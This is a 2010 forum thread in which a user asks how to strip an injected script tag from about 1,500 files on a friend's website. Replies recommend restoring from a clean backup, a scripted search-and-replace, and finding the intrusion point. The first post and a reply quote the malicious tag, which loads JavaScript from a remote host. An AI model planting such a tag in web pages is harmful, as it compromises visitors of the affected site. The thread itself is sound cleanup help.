---
title: "Remove trojan from a website"
date: 2010-06-28
forum: General Help
---

### Post by OOzypal on 2010-06-28
Hello,

One of my friends website has the following code in almost 1500 files
```
<script type="text/javascript" src="http://kollinsoy.skyefenton.com:8080/Data_Type.js"></script>
<!--db99f6effefc0ff79b57c785dc1a107c-->

```

How can I remove it? I tried clamscan but it did not find anything. I was thinking if I can use grep/sed to remove the above from the files. Any ideas?

---

### Post by yeleek on 2010-06-28
> **OOzypal said:**
> Hello,

One of my friends website has the following code in almost 1500 files
```
<script type="text/javascript" src="http://kollinsoy.skyefenton.com:8080/Data_Type.js"></script>
<!--db99f6effefc0ff79b57c785dc1a107c-->

```

How can I remove it? I tried clamscan but it did not find anything. I was thinking if I can use grep/sed to remove the above from the files. Any ideas?

If someone has managed to embed malicious scripts in a webpage, restore from backups.  You've no idea what could be left behind.

And if you really want to update it - search and replace for those lines with null via any of many editing apps - such as gedit.

---

### Post by OOzypal on 2010-06-28
OMG :)

How can I open 1500 files to remove the malicious code. This will be tedious work?

Is there a better way?

Thx

---

### Post by yeleek on 2010-06-28
As i say, restore from backup...  If you do this manually, and miss anything problem remains.

If you do not have backups.  Google - the below would work, but would need to create a loop around it.

[http://www.linuxquestions.org/questions/programming-9/shell-script-to-delete-line-if-pattern-exists-197539/](http://www.linuxquestions.org/questions/programming-9/shell-script-to-delete-line-if-pattern-exists-197539/)

---

### Post by ashokiiit on 2010-06-28
Hey it seems to be interesting.... can we edit the webpage that we see in the browser ?? How ??

---

### Post by Mark Phelps on 2010-06-28
> **ashokiiit said:**
> Hey it seems to be interesting.... can we edit the webpage that we see in the browser ?? How ??

Basically -- NO.

The source code for the webpage exists on the web server. In some cases, you can view the source on the PC client.  You require write access to the source files on the web server to make any changes to the code.

---

### Post by pricetech on 2010-06-28
Restoring from a known good, and known clean, backup is the best solution in the short term.

More importantly your friend needs to determine how his / her website got modified in the first place and secure against further intrusion.

---

### Post by OOzypal on 2010-06-28
She does not have a clean backup :(.

I think the best bet is to write a grep/sed script to remove the malicious code. Unfortunately, I don't know how :(.

---

